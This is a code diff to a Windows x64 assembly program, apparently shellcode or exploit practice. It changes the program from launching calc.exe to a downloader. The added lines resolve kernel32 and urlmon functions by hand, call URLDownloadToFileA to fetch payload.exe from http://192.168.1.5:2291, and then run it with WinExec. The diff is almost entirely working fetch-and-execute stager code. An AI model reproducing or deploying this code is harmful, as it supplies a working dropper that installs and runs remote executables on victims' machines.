@@ -59,6 +59,7 @@
 
 
         section     .data
+; DEFAULT
 STD_OUTPUT_HANDLE:
         dq          -11
 
@@ -68,50 +69,44 @@ endl:
 szPause:
         db          "pause", 0
 
-szMsg1:
-        db          "msg1", 10, 0
 
-szMsg2:
-        db          "msg2", 10, 0
-
-szMsg3:
-        db          "msg3", 10, 0
-
-utf16Path:
-        dw          utf16('C:\WINDOWS'), 0      ; UTF-16 string
-
-szWinExec:
-        db          "WinExec", 0                ; kernel32.dll
-;        db          "CsrAllocateCaptureBuffer", 0       ; ntdll.dll
-        
-szLoadLibraryA:
-        db          "LoadLibraryA", 0           ; kernel32.dll
-
-szGetProcAddress:
-        db          "GetProcAddress", 0         ; kernel32.dll
-
-szCalc:
-        db          "calc.exe", 0
-;        db          "cmd.exe", 0
-;        db          "reg.exe", 0      
-
+; KERNEL32.DLL
 szKernel32:
         db          "kernel32.dll", 0
-        
-WIN:
-        db          10, "WIN", 10, 0
-        
-task:
-        db          10, "Name idx -> ordinal -> addr", 10, 0
-        
-        
+
+szWinExec:
+        db          "WinExec", 0
+
+szLoadLibraryA:
+        db          "LoadLibraryA", 0
+
+szGetProcAddress:
+        db          "GetProcAddress", 0
+  
+
+; URLMON.DLL 
+szUrlmon:
+        db          "urlmon.dll", 0
+
+szURLDownloadToFileA:
+        db          "URLDownloadToFileA", 0
+
+      
+; STRINGS
+szCalc:
+        db          "calc.exe", 0
+
+szUrl:
+        db          "http://192.168.1.5:2291/payload.exe", 0
+
+szPayload:
+        db          "payload.exe", 0
+
+
 
         section     .bss
-szBuffer:
+szBuffer1:
         resb        24
-
-buf:
-        resq        1
 
 
 
@@ -122,44 +117,75 @@ WinMain:
         %push       proc_context
         %stacksize  flat64
         %assign     %$localsize 64
-        %local      iNum1:qword
-        %local      iNum2:qword
-        %local      iNum3:qword
-        
+          
+        ; KERNEL32.DLL
+        %local      hKernel32:qword
         %local      pLoadLibraryA:qword
         %local      pGetProcAddress:qword
-        
-        %local      hKernel32:qword     ; Handler to kernel32.dll
-        
-        
         %local      pWinExec:qword
+        
+        ; URLMON.DLL
+        %local      hUrlmon:qword
+        %local      pURLDownloadToFileA:qword
+
+
+        ; OTHER VARS
+        %local      iNum1:qword
         align_enter %$localsize
         
         
-        ; Find LoadLibraryA
+        ; IMPORT
+        ; LoadLibraryA
         lea         rcx, [szLoadLibraryA]
         call        GetKernel32ProcAddress
         mov         qword [pLoadLibraryA], rax
-        
-        
-        ; Find GetProcAddress
+        ; GetProcAddress
         lea         rcx, [szGetProcAddress]
         call        GetKernel32ProcAddress
         mov         qword [pGetProcAddress], rax
                 
         
-        ; Find WinExec
+        ; KERNEL32.DLL
         lea         rcx, [szKernel32] 
         call        qword [pLoadLibraryA]
         mov         qword [hKernel32], rax
-        
+        ; WinExec     
         mov         rcx, qword [hKernel32]
         lea         rdx, [szWinExec]
         call        qword [pGetProcAddress]
         mov         qword [pWinExec], rax
         
-        ; Call WinExec     
-        lea         rcx, [szCalc]
+        
+        ; URLMON.DLL
+        lea         rcx, [szUrlmon] 
+        call        qword [pLoadLibraryA]
+        mov         qword [hUrlmon], rax
+        ; URLDownloadToFileA
+        mov         rcx, qword [hUrlmon]
+        lea         rdx, [szURLDownloadToFileA]
+        call        qword [pGetProcAddress]
+        mov         qword [pURLDownloadToFileA], rax
+        
+        
+        mov         rcx, [pWinExec]
+        mov         rdx, 16
+        call        PrintNum
+        
+        mov         rcx, [pURLDownloadToFileA]
+        mov         rdx, 16
+        call        PrintNum
+        
+        
+        ; pURLDownloadToFileA(NULL, url.c_str(), filename.c_str(), 0, NULL);
+        mov         rcx, 0
+        lea         rdx, [szUrl]
+        lea         r8, [szPayload]
+        mov         r9, 0
+        mov         qword [rsp+32], 0
+        call        qword [pURLDownloadToFileA]
+        
+        ; Call WinExec
+        lea         rcx, [szPayload]
         mov         rdx, 5
         call        qword [pWinExec]
         
